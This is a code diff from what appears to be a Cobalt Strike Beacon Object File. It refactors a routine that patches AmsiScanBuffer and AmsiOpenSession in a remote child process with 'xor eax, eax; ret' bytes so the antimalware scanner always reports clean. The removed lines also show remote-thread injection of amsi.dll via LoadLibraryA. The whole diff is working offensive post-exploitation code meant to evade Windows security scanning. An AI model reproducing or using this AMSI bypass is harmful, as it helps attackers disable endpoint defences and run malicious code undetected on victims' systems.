@@ -147,58 +147,13 @@ static BOOL PatchRemoteFunction(HANDLE hProcess, HMODULE hLocalMod,
 }
 
 static void PatchAMSI(HANDLE hProcess) {
-    HMODULE hKernel = KERNEL32$GetModuleHandleA("kernel32.dll");
-    if (!hKernel) return;
-
-    FARPROC pLoadLib = KERNEL32$GetProcAddress(hKernel, "LoadLibraryA");
-    if (!pLoadLib) return;
-
-    const char amsiName[] = "amsi.dll";
-    LPVOID pRemoteStr = KERNEL32$VirtualAllocEx(hProcess, NULL, sizeof(amsiName),
-                                                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!pRemoteStr) return;
-
-    SIZE_T bw = 0;
-    KERNEL32$WriteProcessMemory(hProcess, pRemoteStr, amsiName, sizeof(amsiName), &bw);
-
-    HANDLE hThread = KERNEL32$CreateRemoteThread(hProcess, NULL, 0,
-        (LPTHREAD_START_ROUTINE)pLoadLib, pRemoteStr, 0, NULL);
-    if (!hThread) {
-        KERNEL32$VirtualFreeEx(hProcess, pRemoteStr, 0, MEM_RELEASE);
-        return;
-    }
-
-    KERNEL32$WaitForSingleObject(hThread, 5000);
-
-    DWORD exitCode = 0;
-    KERNEL32$GetExitCodeThread(hThread, &exitCode);
-    KERNEL32$CloseHandle(hThread);
-    KERNEL32$VirtualFreeEx(hProcess, pRemoteStr, 0, MEM_RELEASE);
-
-    if (exitCode == 0) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[!] amsi.dll load failed in child (may not exist)");
-        return;
-    }
-
-    HMODULE hAmsi = KERNEL32$LoadLibraryA("amsi.dll");
+    HMODULE hAmsi = KERNEL32$GetModuleHandleA("amsi.dll");
     if (!hAmsi) return;
 
-    /* xor eax, eax; ret — AmsiScanBuffer returns S_OK, result = AMSI_RESULT_CLEAN */
-    BYTE amsiPatch[] = { 0x31, 0xC0, 0xC3 };
-    if (PatchRemoteFunction(hProcess, hAmsi, "AmsiScanBuffer", amsiPatch, sizeof(amsiPatch))) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] AMSI: AmsiScanBuffer patched (verified)");
-    } else {
-        BeaconPrintf(CALLBACK_OUTPUT, "[!] AMSI: AmsiScanBuffer patch FAILED");
-    }
-
-    BYTE amsiOpenPatch[] = { 0x31, 0xC0, 0xC3 };
-    if (PatchRemoteFunction(hProcess, hAmsi, "AmsiOpenSession", amsiOpenPatch, sizeof(amsiOpenPatch))) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] AMSI: AmsiOpenSession patched (verified)");
-    } else {
-        BeaconPrintf(CALLBACK_OUTPUT, "[!] AMSI: AmsiOpenSession patch failed");
-    }
-
-    KERNEL32$FreeLibrary(hAmsi);
+    BYTE patch[] = { 0x31, 0xC0, 0xC3 };
+    if (PatchRemoteFunction(hProcess, hAmsi, "AmsiScanBuffer", patch, sizeof(patch)))
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] AMSI: patched");
+    PatchRemoteFunction(hProcess, hAmsi, "AmsiOpenSession", patch, sizeof(patch));
 }
 
 static void PatchETW(HANDLE hProcess) {
